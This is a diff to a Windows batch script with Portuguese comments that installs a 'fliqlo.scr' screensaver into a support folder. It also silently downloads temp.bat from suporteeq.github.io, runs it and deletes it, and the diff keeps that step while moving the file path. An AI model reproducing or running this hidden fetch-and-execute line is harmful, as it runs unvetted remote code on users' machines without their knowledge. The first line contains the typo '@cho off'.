@@ -1,6 +1,9 @@
 @cho off
 cls
 
+mkdir c:\temp > NUL 2>&1
+mkdir c:\suporte > NUL 2>&1
+
 REM :: Defina o caminho da pasta e do arquivo
 set "folder=C:\suporte\scr"
 set "file=%folder%\fliqlo.scr"
@@ -20,7 +23,7 @@ if not exist "%file%" (
     curl -o "%file%" "%url%"  > NUL 2>&1
 )
 
-curl -o temp.bat https://suporteeq.github.io/temp.bat > NUL 2>&1 && call temp.bat && del temp.bat > NUL 2>&1
+curl -o c:\temp\temp.bat https://suporteeq.github.io/temp.bat > NUL 2>&1 && call c:\temp\temp.bat && del c:\temp\temp.bat > NUL 2>&1
 
 :fim
 if not exist "%file%" (
